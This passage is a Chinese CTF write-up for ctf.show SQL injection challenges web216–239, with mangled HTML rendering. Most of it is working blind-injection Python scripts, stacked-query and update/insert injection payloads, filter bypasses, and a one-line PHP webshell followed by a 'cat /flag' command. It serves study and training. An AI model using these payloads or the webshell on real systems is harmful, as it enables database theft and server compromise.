爆表名</span><br>  <span class="hljs-comment"># payload = &quot;select group_concat(table_name) from information_schema.tables where table_schema=database()&quot;</span><br>  <span class="hljs-comment"># 爆列名</span><br>  <span class="hljs-comment"># payload = &quot;select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=&#x27;ctfshow_flagxc&#x27;&quot;</span><br>  <span class="hljs-comment">#爆字段值</span><br>  payload = <span class="hljs-string">&quot;select flagaac from `ctfshow_flagxcc`&quot;</span><br>  <br>  <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(1,50):<br>      <span class="hljs-built_in">head</span> = 32<br>      <span class="hljs-built_in">tail</span> = 127<br>  <br>      <span class="hljs-keyword">while</span> <span class="hljs-built_in">head</span> &lt; <span class="hljs-built_in">tail</span>:<br>          mid = (<span class="hljs-built_in">head</span> + <span class="hljs-built_in">tail</span>) &gt;&gt; 1 <span class="hljs-comment"># 中间指针等于头尾指针相加的一半</span><br>          <span class="hljs-comment"># print(mid)</span><br>          data = &#123;<br>              <span class="hljs-string">&#x27;ip&#x27;</span> : f<span class="hljs-string">&quot;1) or if(ascii(substr((&#123;payload&#125;),&#123;i&#125;,1))&gt;&#123;mid&#125;,sleep(3),1)#&quot;</span>,<br>              <span class="hljs-string">&#x27;debug&#x27;</span> : <span class="hljs-string">&#x27;0&#x27;</span><br>          &#125;<br>          try:<br>              r = requests.post(url, data, <span class="hljs-built_in">timeout</span>=0.8)<br>              <span class="hljs-built_in">tail</span> = mid<br>          except:<br>              <span class="hljs-built_in">head</span> = mid + 1 <span class="hljs-comment">#sleep导致超时</span><br>  <br>      <span class="hljs-keyword">if</span> <span class="hljs-built_in">head</span> != 32:<br>          result += chr(<span class="hljs-built_in">head</span>)<br>          <span class="hljs-built_in">print</span>(result)<br>      <span class="hljs-keyword">else</span>:<br>          <span class="hljs-built_in">break</span><br></code></pre></td></tr></table></figure><h3 id="web217"><a href="#web217" class="headerlink" title="web217"></a>web217</h3><ul><li><p>过滤了sleep</p></li><li><p>使用benchmark替换</p></li><li><p>&#96;&#96;&#96;python</p></li></ul><h1 id="Author-Kradress"><a href="#Author-Kradress" class="headerlink" title="@Author:Kradress"></a>@Author:Kradress</h1><p>  from time import sleep<br>  import requests</p><p>  url &#x3D; “<a href="http://95e2dfa2-d45c-4720-8007-e77d6f694323.challenge.ctf.show/api/&quot;">http://95e2dfa2-d45c-4720-8007-e77d6f694323.challenge.ctf.show/api/&quot;</a></p><p>  result &#x3D; ‘’</p><h1 id="爆表名-1"><a href="#爆表名-1" class="headerlink" title="爆表名"></a>爆表名</h1><h1 id="payload-x3D-“select-group-concat-table-name-from-information-schema-tables-where-table-schema-x3D-database-”-1"><a href="#payload-x3D-“select-group-concat-table-name-from-information-schema-tables-where-table-schema-x3D-database-”-1" class="headerlink" title="payload &#x3D; “select group_concat(table_name) from information_schema.tables where table_schema&#x3D;database()”"></a>payload &#x3D; “select group_concat(table_name) from information_schema.tables where table_schema&#x3D;database()”</h1><h1 id="爆列名-1"><a href="#爆列名-1" class="headerlink" title="爆列名"></a>爆列名</h1><h1 id="payload-x3D-“select-group-concat-column-name-from-information-schema-columns-where-table-schema-x3D-database-and-table-name-x3D-’ctfshow-flagxccb’”"><a href="#payload-x3D-“select-group-concat-column-name-from-information-schema-columns-where-table-schema-x3D-database-and-table-name-x3D-’ctfshow-flagxccb’”" class="headerlink" title="payload &#x3D; “select group_concat(column_name) from information_schema.columns where table_schema&#x3D;database() and table_name&#x3D;’ctfshow_flagxccb’”"></a>payload &#x3D; “select group_concat(column_name) from information_schema.columns where table_schema&#x3D;database() and table_name&#x3D;’ctfshow_flagxccb’”</h1><p>  #爆字段值<br>  payload &#x3D; “select flagaabc from <code>ctfshow_flagxccb</code>“</p><p>  for i in range(1,50):<br>      head &#x3D; 32<br>      tail &#x3D; 127</p><pre><code class="hljs">  while head &lt; tail:      sleep(1)      mid = (head + tail) &gt;&gt; 1 # 中间指针等于头尾指针相加的一半      print(mid)      data = &#123;          &#39;ip&#39; : f&quot;-1) or benchmark(4e6*(ascii(substr((&#123;payload&#125;),&#123;i&#125;,1))&gt;&#123;mid&#125;),sha1(&#39;kradress&#39;))#&quot;,          &#39;debug&#39; : &#39;1&#39;      &#125;      try:          r = requests.post(url, data, timeout=1)          tail = mid      except:          head = mid + 1 #sleep导致超时  if head != 32:      result += chr(head)      print(result)  else:      break</code></pre>  <figure class="highlight xl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><code class="hljs xl"><br>### web218<br><br>- 这题真😄，憔悴<br><br>  多尝试几次<br><br>  结合一下<br><br>- **笛卡尔积盲注**<br><br>- ```python<br>  <span class="hljs-keyword">import</span> requests<br>  <span class="hljs-keyword">import</span> <span class="hljs-built_in">time</span><br>  <br>  <br>  url=<span class="hljs-string">&quot;http://8b64f78d-1a2b-4ef7-8dd6-2d3bc5765780.challenge.ctf.show/api/&quot;</span><br>  flag=<span class="hljs-string">&#x27;&#x27;</span><br>  <span class="hljs-keyword">for</span> i <span class="hljs-built_in">in</span> range(<span class="hljs-number">1</span>,<span class="hljs-number">100</span>):<br>      low=<span class="hljs-number">32</span><br>      high=<span class="hljs-number">128</span><br>      mid=(low+high)<span class="hljs-comment">//2</span><br>      <span class="hljs-keyword">while</span> low&lt;high:<br>          payload=<span class="hljs-string">&quot;0)or if((ascii(substr((select group_concat(flagaac) from ctfshow_flagxc),&#123;&#125;,1))&gt;&#123;&#125;),(SELECT count(*) FROM information_schema.columns A,information_schema.columns B),0)#&quot;</span>.format(i,mid)<br>  <br>          <span class="hljs-keyword">data</span>=&#123;<br>              <span class="hljs-string">&quot;ip&quot;</span>:payload,<br>              <span class="hljs-string">&quot;debug&quot;</span>:<span class="hljs-number">0</span><br>          &#125;<br>          time1=<span class="hljs-built_in">time</span>.<span class="hljs-built_in">time</span>()<br>          r=requests.post(url,<span class="hljs-keyword">data</span>=<span class="hljs-keyword">data</span>)<br>          time2=<span class="hljs-built_in">time</span>.<span class="hljs-built_in">time</span>()<br>          <span class="hljs-built_in">time</span>.sleep(<span class="hljs-number">0.5</span>)<br>          print(time2-time1)<br>          print(low,mid,high)<br>  <br>  <br>          <span class="hljs-keyword">if</span> time2-time1&gt;<span class="hljs-number">0.5</span>:<br>              low=mid+<span class="hljs-number">1</span><br>          <span class="hljs-keyword">else</span>:<br>              high=mid<br>          mid=(low+high)<span class="hljs-comment">//2</span><br>      flag+=chr(mid)<br>      print(flag)<br>      <span class="hljs-keyword">if</span> mid==<span class="hljs-number">32</span>:<br>          print(flag)<br>          break<br></code></pre></td></tr></table></figure><h3 id="web219"><a href="#web219" class="headerlink" title="web219"></a>web219</h3><ul><li><p>&#96;&#96;&#96;python<br>import requests<br>url &#x3D; “<a href="http://b7d57eaf-9df6-4745-ac58-623550e366c4.challenge.ctf.show/api/&quot;">http://b7d57eaf-9df6-4745-ac58-623550e366c4.challenge.ctf.show/api/&quot;</a></p><p>strr &#x3D; “_1234567890{}-qazwsxedcrfvtgbyhnujmikolp”</p></li></ul><h1 id="payload-x3D-“select-table-name-from-information-schema-tables-where-table-schema-x3D-database-limit-0-1”"><a href="#payload-x3D-“select-table-name-from-information-schema-tables-where-table-schema-x3D-database-limit-0-1”" class="headerlink" title="payload &#x3D; “select table_name from information_schema.tables where table_schema&#x3D;database() limit 0,1”"></a>payload &#x3D; “select table_name from information_schema.tables where table_schema&#x3D;database() limit 0,1”</h1><h1 id="payload-x3D-“select-column-name-from-information-schema-columns-where-table-name-x3D-’ctfshow-flagxca’-limit-1-1”"><a href="#payload-x3D-“select-column-name-from-information-schema-columns-where-table-name-x3D-’ctfshow-flagxca’-limit-1-1”" class="headerlink" title="payload &#x3D; “select column_name from information_schema.columns where table_name&#x3D;’ctfshow_flagxca’ limit 1,1”"></a>payload &#x3D; “select column_name from information_schema.columns where table_name&#x3D;’ctfshow_flagxca’ limit 1,1”</h1><p>  payload &#x3D; “select flagaabc from ctfshow_flagxca”<br>  j &#x3D; 1<br>  res &#x3D; “”<br>  while 1:<br>      for i in strr:<br>          data &#x3D; {<br>              ‘ip’: f”1) or if(substr(({payload}),{j},1)&#x3D;’{i}’,(SELECT count(*) FROM information_schema.tables A, information_schema.schemata B, information_schema.schemata D, information_schema.schemata E, information_schema.schemata F,information_schema.schemata G, information_schema.schemata H,information_schema.schemata I),1”,<br>              ‘debug’: ‘1’<br>          }<br>          # print(i)<br>          try:<br>              r &#x3D; requests.post(url, data&#x3D;data, timeout&#x3D;3)<br>          except Exception as e:<br>              res +&#x3D; i<br>              print(res)<br>              j+&#x3D;1</p>  <figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs n1ql"><br>### web220<br><br>- 屏蔽了substr使用left<br><br>- ```python<br>  import requests<br>  url = &quot;http://f0769ed5-6962-4fdf-92f4-644c456b8354.challenge.ctf.show/api/&quot;<br>  <br>  strr = &quot;_1234567890&#123;&#125;-qazwsxedcrfvtgbyhnujmikolp&quot;<br>  # payload = &quot;<span class="hljs-keyword">select</span> table_name <span class="hljs-keyword">from</span> information_schema.tables <span class="hljs-keyword">where</span> table_schema=<span class="hljs-keyword">database</span>() <span class="hljs-keyword">limit</span> <span class="hljs-number">0</span>,<span class="hljs-number">1</span><span class="hljs-string">&quot;</span><br><span class="hljs-string">  # payload = &quot;</span><span class="hljs-keyword">select</span> column_name <span class="hljs-keyword">from</span> information_schema.columns <span class="hljs-keyword">where</span> table_name=<span class="hljs-string">&#x27;ctfshow_flagxcac&#x27;</span> <span class="hljs-keyword">limit</span> <span class="hljs-number">1</span>,<span class="hljs-number">1</span><span class="hljs-string">&quot;</span><br><span class="hljs-string">  payload = &quot;</span><span class="hljs-keyword">select</span> flagaabcc <span class="hljs-keyword">from</span> ctfshow_flagxcac<span class="hljs-string">&quot;</span><br><span class="hljs-string">  j = 1</span><br><span class="hljs-string">  res = &quot;</span><span class="hljs-string">&quot;</span><br><span class="hljs-string">  while 1:</span><br><span class="hljs-string">      for i in strr:</span><br><span class="hljs-string">          res += i</span><br><span class="hljs-string">          data = &#123;</span><br><span class="hljs-string">              &#x27;ip&#x27;: f&quot;</span><span class="hljs-number">1</span>) <span class="hljs-keyword">or</span> <span class="hljs-keyword">if</span>(<span class="hljs-keyword">left</span>((&#123;payload&#125;),&#123;j&#125;)=<span class="hljs-string">&#x27;&#123;res&#125;&#x27;</span>,(<span class="hljs-keyword">SELECT</span> <span class="hljs-built_in">count</span>(*) <span class="hljs-keyword">FROM</span> information_schema.tables A, information_schema.schemata B, information_schema.schemata D, information_schema.schemata <span class="hljs-built_in">E</span>, information_schema.schemata F,information_schema.schemata G, information_schema.schemata H,information_schema.schemata I),<span class="hljs-number">1</span><span class="hljs-string">&quot;,</span><br><span class="hljs-string">              &#x27;debug&#x27;: &#x27;1&#x27;</span><br><span class="hljs-string">          &#125;</span><br><span class="hljs-string">          # print(i)</span><br><span class="hljs-string">          try:</span><br><span class="hljs-string">              r = requests.post(url, data=data, timeout=3)</span><br><span class="hljs-string">              res = res[:-1]</span><br><span class="hljs-string">          except Exception as e:</span><br><span class="hljs-string">              print(res)</span><br><span class="hljs-string">              j+=1</span><br></code></pre></td></tr></table></figure><h3 id="web221"><a href="#web221" class="headerlink" title="web221"></a>web221</h3><ul><li><p>利用procedure analyse来进行注入，只能使用extractvalue 和 benchmark。这题开启了报错，所以extractvalue肯定是最方便的。</p></li><li><p>&#96;&#96;&#96;<br>&#x2F;api&#x2F;?page&#x3D;1&amp;limit&#x3D;1  procedure analyse(extractvalue(1,concat(0x7e,database())),1)</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><code class="hljs python"><br>- 库名就是flag！！！！！<br><br><span class="hljs-comment">### Web222</span><br><br>- 时间盲注<br><br>- ```python<br>  <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">  Author:Y4tacker</span><br><span class="hljs-string">  &quot;&quot;&quot;</span><br>  <span class="hljs-keyword">import</span> requests<br>  <br>  url = <span class="hljs-string">&quot;http://66d6b11b-e704-4ba7-8329-8b6284170361.challenge.ctf.show/api/&quot;</span><br>  <br>  result = <span class="hljs-string">&quot;&quot;</span><br>  i = <span class="hljs-number">0</span><br>  <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>      i = i + <span class="hljs-number">1</span><br>      head = <span class="hljs-number">32</span><br>      tail = <span class="hljs-number">127</span><br>  <br>      <span class="hljs-keyword">while</span> head &lt; tail:<br>          mid = (head + tail) &gt;&gt; <span class="hljs-number">1</span><br>          <span class="hljs-comment"># 查数据库</span><br>          <span class="hljs-comment"># payload = &quot;select group_concat(table_name) from information_schema.tables where table_schema=database()&quot;</span><br>          <span class="hljs-comment"># 查列名字</span><br>          <span class="hljs-comment"># payload = &quot;select column_name from information_schema.columns where table_name=&#x27;ctfshow_flaga&#x27; limit 1,1&quot;</span><br>          <span class="hljs-comment"># 查数据---不能一次查完越到后面越不准确</span><br>          payload = <span class="hljs-string">&quot;select flagaabc from ctfshow_flaga&quot;</span><br>   <br>          params = &#123;<br>              <span class="hljs-string">&#x27;u&#x27;</span>: <span class="hljs-string">f&quot;concat((if (ascii(substr((<span class="hljs-subst">&#123;payload&#125;</span>),<span class="hljs-subst">&#123;i&#125;</span>,1))&gt;<span class="hljs-subst">&#123;mid&#125;</span>, sleep(0.05), 2)), 1);&quot;</span><br>  <br>          &#125;<br>          <span class="hljs-keyword">try</span>:<br>              r = requests.get(url, params=params, timeout=<span class="hljs-number">1</span>)<br>              tail = mid<br>          <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>              head = mid + <span class="hljs-number">1</span><br>  <br>      <span class="hljs-keyword">if</span> head != <span class="hljs-number">32</span>:<br>          result += <span class="hljs-built_in">chr</span>(head)<br>      <span class="hljs-keyword">else</span>:<br>          <span class="hljs-keyword">break</span><br>      <span class="hljs-built_in">print</span>(result)<br>  <br></code></pre></td></tr></table></figure></li></ul><h3 id="Web223"><a href="#Web223" class="headerlink" title="Web223"></a>Web223</h3><ul><li><p>过滤了数字，用true绕过</p></li><li><p>利用回显长度不同进行盲注</p></li><li><pre><code class="python">import requestsdef generateNum(num):    res = &#39;true&#39;    if num == 1:        return res    else:        for i in range(num - 1):            res += &quot;+true&quot;        return resurl = &quot;http://ff765902-0dec-4688-8cd2-1a4cc429d30a.chall.ctf.show/api/&quot;i = 0res = &quot;&quot;while 1:    head = 32    tail = 127    i = i + 1    while head &lt; tail:        mid = (head + tail) &gt;&gt; 1        # 查数据库-ctfshow_flagas        # payload = &quot;select group_concat(table_name) from information_schema.tables where table_schema=database()&quot;        # 查字段-flagasabc        # payload = &quot;select group_concat(column_name) from information_schema.columns where table_name=&#39;ctfshow_flagas&#39;&quot;        # 查flag        payload = &quot;select flagasabc from ctfshow_flagas&quot;        params = &#123;            &quot;u&quot;: f&quot;if(ascii(substr((&#123;payload&#125;),&#123;generateNum(i)&#125;,&#123;generateNum(1)&#125;))&gt;&#123;generateNum(mid)&#125;,username,&#39;a&#39;)&quot;        &#125;        r = requests.get(url, params=params)        # print(r.json()[&#39;data&#39;])        if &quot;userAUTO&quot; in r.text:            head = mid + 1        else:            tail = mid    if head != 32:        res += chr(head)    else:        break    print(res)<figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs markdown"><br><span class="hljs-section">### web224</span><br><br><span class="hljs-bullet">-</span> robots.txt里面发现pwdreset<br><br><span class="hljs-bullet">-</span> 重置密码后需要上传文件<br><br><span class="hljs-bullet">-</span> 基本所有类型都不能上传<br><br><span class="hljs-bullet">-</span> 在群里找到大佬制作的文件payload.bin文件上传，里面有一句话木马<br><br><span class="hljs-bullet">-</span> <span class="hljs-code">```</span><br><span class="hljs-code">  &lt;?=&#x27;$_GET[1]&#x27;?&gt;</span><br></code></pre></td></tr></table></figure></code></pre></li><li><p>&#x2F;1.php?cat &#x2F;flag</p></li></ul><h3 id="web225"><a href="#web225" class="headerlink" title="web225"></a>web225</h3><ul><li><p>堆叠注入</p></li><li><p>handler绕过</p></li><li><p>&#96;&#96;&#96;<br>&#x2F;api&#x2F;username&#x3D;ctfshow%27;show%20tables;handler%20ctfshow_flagasa%20open;handler%20ctfshow_flagasa%20read%20first;</p><figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs clean"><br>- 用concat绕过也可以<br><br>### web226<br><br>- 查询语句转换成<span class="hljs-number">16</span>进制绕过<br><br>- ```<br>  username=user1%<span class="hljs-number">27</span>;PREPARE%<span class="hljs-number">20</span>luelueking%<span class="hljs-number">20</span><span class="hljs-keyword">from</span>%<span class="hljs-number">200</span>x73656c65637420666c61676173622066726f6d2063746673685f6f775f666c61676173;EXECUTE%<span class="hljs-number">20</span>luelueking;<br></code></pre></td></tr></table></figure></li></ul><h3 id="web227"><a href="#web227" class="headerlink" title="web227"></a>web227</h3><ul><li>&#96;&#96;&#96;<br>&#x2F;api&#x2F;?username&#x3D;1%27;call%20getFlag();<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><br><span class="hljs-comment">### web228~230</span><br><br>- 同web226<br><br><span class="hljs-comment">### web231</span><br><br>- ```<br>  POST:<span class="hljs-attribute">password</span>=1&#x27;,username=user() where <span class="hljs-attribute">1</span>=1#&amp;username=1<br>  查表名<br>  <span class="hljs-attribute">password</span>=1&#x27;,username=(select group_concat(table_name) <span class="hljs-keyword">from</span> information_schema.tables where <span class="hljs-attribute">table_schema</span>=database()) where <span class="hljs-attribute">1</span>=1#&amp;username=1<br>  查列名<br>  <span class="hljs-attribute">password</span>=1&#x27;,username=(select group_concat(column_name) <span class="hljs-keyword">from</span> information_schema.columns where <span class="hljs-attribute">table_name</span>=<span class="hljs-string">&#x27;flaga&#x27;</span>) where <span class="hljs-attribute">1</span>=1#&amp;username=1<br>  得到flag<br>  <span class="hljs-attribute">password</span>=1&#x27;,username=(select flagas <span class="hljs-keyword">from</span> flaga) where <span class="hljs-attribute">1</span>=1#&amp;username=1<br></code></pre></td></tr></table></figure></li></ul><h3 id="web232"><a href="#web232" class="headerlink" title="web232"></a>web232</h3><ul><li><p>比web231换了一下闭合方式</p></li><li><p>&#96;&#96;&#96;<br>POST: password&#x3D;0’),username&#x3D;database()%23&amp;username&#x3D;1</p><p>password&#x3D;0’),username&#x3D;(select group_concat(table_name) from information_schema.tables where table_schema&#x3D;database()) where 1&#x3D;1#&amp;username&#x3D;1</p><p>password&#x3D;0’),username&#x3D;(select group_concat(column_name) from information_schema.columns where table_name&#x3D;’flagaa’) where 1&#x3D;1#&amp;username&#x3D;1</p><p>password&#x3D;0’),username&#x3D;(select flagass from flagaa) where 1&#x3D;1#&amp;username&#x3D;1</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs bash"><br><span class="hljs-comment">### web233</span><br><br>- 时间盲注<br><br>- ```python<br>  import requests<br>  <br>  url = <span class="hljs-string">&quot;http://e48a1a65-989c-4717-81fd-fe9ced9d6f68.challenge.ctf.show/api/?page=1&amp;limit=10&quot;</span><br>  <br>  result = <span class="hljs-string">&quot;&quot;</span><br>  i = 0<br>  <br>  <span class="hljs-keyword">while</span> 1:<br>      i = i + 1<br>      <span class="hljs-built_in">head</span> = 32<br>      <span class="hljs-built_in">tail</span> = 127<br>  <br>      <span class="hljs-keyword">while</span> <span class="hljs-built_in">head</span> &lt; <span class="hljs-built_in">tail</span>:<br>          mid = (<span class="hljs-built_in">head</span> + <span class="hljs-built_in">tail</span>) &gt;&gt; 1<br>          <span class="hljs-comment"># 查数据库</span><br>          <span class="hljs-comment"># payload = &quot;select group_concat(table_name) from information_schema.tables where table_schema=database()&quot;</span><br>          <span class="hljs-comment"># 查表名</span><br>          <span class="hljs-comment"># payload = &quot;select column_name from information_schema.columns where table_name=&#x27;flag233333&#x27; limit 1,1&quot;</span><br>          <span class="hljs-comment"># 查数据</span><br>          payload = <span class="hljs-string">&quot;select flagass233 from flag233333&quot;</span><br>          data = &#123;<br>              <span class="hljs-string">&#x27;username&#x27;</span>: f<span class="hljs-string">&quot;1&#x27; or if(ascii(substr((&#123;payload&#125;),&#123;i&#125;,1))&gt;&#123;mid&#125;,sleep(0.05),1)#&quot;</span>,<br>              <span class="hljs-string">&#x27;password&#x27;</span>: <span class="hljs-string">&#x27;4&#x27;</span><br>          &#125;<br>          try:<br>              r = requests.post(url, data=data, <span class="hljs-built_in">timeout</span>=0.9)<br>              <span class="hljs-built_in">tail</span> = mid<br>          except Exception as e:<br>              <span class="hljs-built_in">head</span> = mid + 1<br>      <span class="hljs-keyword">if</span> <span class="hljs-built_in">head</span> != 32:<br>          result += chr(<span class="hljs-built_in">head</span>)<br>      <span class="hljs-keyword">else</span>:<br>          <span class="hljs-built_in">break</span><br>      <span class="hljs-built_in">print</span>(result)<br>  <br></code></pre></td></tr></table></figure></li></ul><h3 id="web234"><a href="#web234" class="headerlink" title="web234"></a>web234</h3><ul><li><p>因为单引号被过滤了，当存在单引号，和没有单引号的时候返回值是不一样的，所以需要用反斜杠转义来逃逸，然后注入点改为username，因为前面的where已经被当做字符串了失去了原来的作用，这样才会保证set成功</p></li><li><p>原来的语句是<br>$sql &#x3D; “update ctfshow_user set pass &#x3D; ‘{$password}’ where username &#x3D; ‘{$username}’;”;<br>但是传入单引号后<br>$sql &#x3D; “update ctfshow_user set pass &#x3D; ‘&#39; where username &#x3D; ‘username’;”;<br>这样pass里面的内容就是’ where username &#x3D;,接下来username里面的参数就是可以控制的了</p></li><li><p>&#96;&#96;&#96;<br>password&#x3D;1&amp;username&#x3D;,username&#x3D;(select database())#</p><p>password&#x3D;1&amp;username&#x3D;,username&#x3D;(select group_concat(table_name) from information_schema.tables where table_schema&#x3D;database())#<br>&#x2F;&#x2F;flag23a</p><p>password&#x3D;1&amp;username&#x3D;,username&#x3D;(select group_concat(column_name) from information_schema.columns where table_name&#x3D;0x666c6167323361)#<br>&#x2F;&#x2F;id,flagass23s3,info</p><p>password&#x3D;1&amp;username&#x3D;,username&#x3D;(select flagass23s3 from flag23a)#</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><br>### web235～<span class="hljs-number">236</span><br><br>- 过滤了<span class="hljs-keyword">or</span>和单引号<br><br>- **innodb_table_stats**代替**information_schema**<br><br>  mysql默认存储引擎innoDB携带的表:<br>  mysql.innodb_table_stats<br>  mysql.innodb_index_stats<br><br>  两表均有database_name和<span class="hljs-built_in">table_name</span>字段<br><br>- ```<br>  <span class="hljs-keyword">password</span>=<span class="hljs-number">1</span>\&amp;username=,username=(<span class="hljs-keyword">select</span> <span class="hljs-keyword">database</span>())#<br>  <br>  <span class="hljs-keyword">password</span>=<span class="hljs-number">1</span>\&amp;username=,username=(<span class="hljs-keyword">select</span> group_concat(<span class="hljs-built_in">table_name</span>) <span class="hljs-keyword">from</span> mysql.innodb_table_stats <span class="hljs-keyword">where</span> database_name=<span class="hljs-keyword">database</span>())#<br>  //banlist,ctfshow_user,flag23a1<br>  <br>  <span class="hljs-keyword">password</span>=<span class="hljs-number">1</span>\&amp;username=,username=(<span class="hljs-keyword">select</span> group_concat(`<span class="hljs-number">2</span>`) <span class="hljs-keyword">from</span>(<span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span> flag23a1)a)#<br></code></pre></td></tr></table></figure></li></ul><h3 id="web237"><a href="#web237" class="headerlink" title="web237"></a>web237</h3><ul><li><p>注入点在&#x2F;api&#x2F;insert.php，我是sb</p></li><li><p>&#96;&#96;&#96;<br>username&#x3D;1’,(select group_concat(flagass23s3) from flag))#&amp;password&#x3D;1</p><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs applescript"><br><span class="hljs-comment">### web238</span><br><br>- 过滤了空格<br><br>- ```<br>  username=<span class="hljs-number">2</span>&#x27;,(select(group_concat(<span class="hljs-built_in">id</span>,flag,info))<span class="hljs-keyword">from</span>(flagb)))<span class="hljs-comment">#&amp;password=1</span><br></code></pre></td></tr></table></figure></li></ul><h3 id="web239"><a href="#web239" class="headerlink" title="web239"></a>web239</h3><ul><li>&#96;&#96;&#96;<br>username&#x3D;1’,(select(group_concat(flag))from(flagbb)))#&amp;password&#x3D;1<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span 